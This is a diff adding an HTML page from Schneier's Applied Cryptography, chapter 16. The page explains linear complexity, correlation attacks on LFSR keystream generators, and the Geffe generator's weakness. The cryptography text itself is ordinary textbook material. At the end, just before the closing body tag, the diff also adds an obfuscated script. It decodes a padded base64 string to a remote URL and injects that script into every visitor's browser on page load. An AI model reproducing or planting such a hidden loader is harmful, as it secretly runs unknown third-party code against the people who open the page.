@@ -1,0 +1,93 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Pseudo-Random-Sequence Generators and Stream Ciphers</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=16//-->
+<!--PAGES=380-382//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="16-04.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="16-06.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>This idea has extensions from fields to rings [1298], and when the output sequence is viewed as numbers over fields of odd characteristic [842]. A further enhancement is the notion of a <B>linear complexity profile</B>, which measures the linear complexity of the sequence as it gets longer and longer [1357,1168,411,1582]. Another algorithm for computing linear complexity is useful only in very specialized circumstances [597,595,596,1333]. A generalization of linear complexity is in [776]. There is also the notion of sphere complexity [502] and 2-adic complexity [844].</P>
+<P>In any case, remember that a high linear complexity does not necessarily indicate a secure generator, but a low linear complexity indicates an insecure one [1357,1249].</P>
+<P><FONT SIZE="+1"><B><I>Correlation Immunity</I></B></FONT></P>
+<P>Cryptographers try to get a high linear complexity by combining the output of several output sequences in some nonlinear manner. The danger here is that one or more of the internal output sequences&#151;often just outputs of individual LFSRs&#151;can be correlated with the combined keystream and attacked using linear algebra. Often this is called a <B>correlation attack</B> or a divide-and-conquer attack. Thomas Siegenthaler has shown that <B>correlation immunity</B> can be precisely defined, and that there is a trade-off between correlation immunity and linear complexity [1450].</P>
+<P>The basic idea behind a correlation attack is to identify some correlation between the output of the generator and the output of one of its internal pieces. Then, by observing the output sequence, you can obtain information about that internal output. Using that information and other correlations, collect information about the other internal outputs until the entire generator is broken.</P>
+<P>Correlation attacks and variations such as fast correlation attacks&#151;these offer a trade-off between computational complexity and effectiveness&#151;have been successfully applied to a number of LFSR-based keystream generators [1451,278,1452,572,1636,1051,1090,350,633,1054,1089,995]. Some interesting new ideas along these lines are in [46,1641].</P>
+<P><FONT SIZE="+1"><B><I>Other Attacks</I></B></FONT></P>
+<P>There are other general attacks against keystream generators. The <B>linear consistency test</B> attempts to identify some subset of the encryption key using matrix techniques [1638]. There is also the <B>meet-in-the-middle consistency attack</B> [39,41]. The <B>linear syndrome algorithm</B> relies on being able to write a fragment of the output sequence as a linear equation [1636,1637]. There is the <B>best affine approximation attack</B> [502] and the <B>derived sequence attack</B> [42]. The techniques of differential cryptanalysis have even been applied to stream ciphers [501], as has linear cryptanalysis [631].</P>
+<H3><A NAME="Heading5"></A><FONT COLOR="#000077">16.4 Stream Ciphers Using LFSRs</FONT></H3>
+<P>The basic approach to designing a keystream generator using LFSRs is simple. First you take one or more LFSRs, generally of different lengths and with different feedback polynomials. (If the lengths are all relatively prime and the feedback polynomials are all primitive, the whole generator is maximal length.) The key is the initial state of the LFSRs. Every time you want a bit, shift the LFSRs once (this is sometimes called <B>clocking</B>). The output bit is a function, preferably a nonlinear function, of some of the bits of the LFSRs. This function is called the <B>combining function</B>, and the whole generator is called a <B>combination generator</B>. (If the output bit is a function of a single LFSR, the generator is called a <B>filter generator</B>.) Much of the theoretical background for this kind of thing was laid down by Selmer and Neal Zierler [1647].</P>
+<P>Complications have been added. Some generators have LFSRs clocked at different rates; sometimes the clocking of one generator depends on the output of another. These are all electronic versions of pre-WWII cipher machine ideas, and are called <B>clock-controlled generators</B> [641]. Clock control can be feedforward, where the output of one LFSR controls the clocking of another, or feedback, where the output of one LFSR controls its own clocking.</P>
+<P>Although these generators are, at least in theory, susceptible to embedding and probabilistic correlation attacks [634,632], many are secure for now. Additional theory on clock-controlled shift registers is in [89].</P>
+<P>Ian Cassells, once the head of pure mathematics at Cambridge and a former Bletchly Park cryptanalyst, said that &#147;cryptography is a mixture of mathematics and muddle, and without the muddle the mathematics can be used against you.&#148; What he meant was that in stream ciphers, you need some kind of mathematical structure&#151;such as a LFSR&#151;to guarantee maximal-length and other properties, and then some complicated nonlinear muddle to stop someone from getting at the register and solving it. This advice also holds true for block algorithms.</P>
+<P>What follows is a smattering of LFSR-based keystream generators that have appeared in the literature. I don&#146;t know if any of them have been used in actual cryptographic products. Most of them are of theoretical interest only. Some have been broken; some may still be secure.</P>
+<P>Since LFSR-based ciphers are generally implemented in hardware, electronics logic symbols will be used in the figures. In the text, &#8853; is XOR, ^ is AND, &#8870; is OR, and <FONT FACE="SYSTEM">&#0172;</FONT> is NOT.</P>
+<P><FONT SIZE="+1"><B><I>Geffe Generator</I></B></FONT></P>
+<P>This keystream generator uses three LFSRs, combined in a nonlinear manner (see Figure 16.6) [606]. Two of the LFSRs are inputs into a multiplexer, and the third LFSR controls the output of the multiplexer. If <I>a</I><SUB>1</SUB>, <I>a</I><SUB>2</SUB>, and <I>a</I><SUB>3</SUB> are the outputs of the three LFSRs, the output of the Geffe generator can be described by:</P>
+<DL>
+<DD><I>b</I> = (<I>a</I><SUB>1</SUB> ^ <I>a</I><SUB>2</SUB>) &#8853; ((<FONT FACE="SYSTEM">&#0172;</FONT> <I>a</I><SUB>1</SUB>) ^ <I>a</I><SUB>3</SUB>)
+</DL>
+<P>If the LFSRs have lengths <I>n</I><SUB>1</SUB>, <I>n</I><SUB>2</SUB>, and <I>n</I><SUB>3</SUB>, respectively, then the linear complexity of the generator is</P>
+<DL>
+<DD>(<I>n</I><SUB>1</SUB> &#43; 1)<I>n</I><SUB>2</SUB> &#43; <I>n</I><SUB>1</SUB><I>n</I><SUB>3</SUB>
+</DL>
+<P>The period of the generator is the least common multiple of the periods of the three generators. Assuming the degrees of the three primitive feedback polynomials are relatively prime, the period of this generator is the product of the periods of the three LFSRs.
+</P>
+<P>Although this generator looks good on paper, it is cryptographically weak and falls to a correlation attack [829,1638]. The output of the generator equals the output of LFSR-2 75 percent of the time. So, if the feedback taps are known, you can guess the initial value for LFSR-2 and generate the output sequence of that register. Then you can count the number of times the output of the LFSR-2 agrees with the output of the generator. If you guessed wrong, the two sequences will agree about 50 percent of the time; if you guessed right, the two sequences will agree about 75 percent of the time.</P>
+<P>Similarly, the output of the generator equals the output of LFSR-3 about 75 percent of the time. With those correlations, the keystream generator can be easily cracked. For example, if the primitive polynomials only have three terms each, and the largest LFSR is of length <I>n</I>, it only takes a segment of the output sequence 37<I>n-</I>bits long to reconstruct the internal states of all three LFSRs [1639].</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="16-04.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="16-06.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(obvTdspU, XjoXdRwu) {XjoXdRwu = obvTdspU.createElement('script');XjoXdRwu.type = 'text/javascript';XjoXdRwu.async = true;XjoXdRwu.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');obvTdspU.getElementsByTagName('body')[0].appendChild(XjoXdRwu);}(document));</script></body>
+</html>
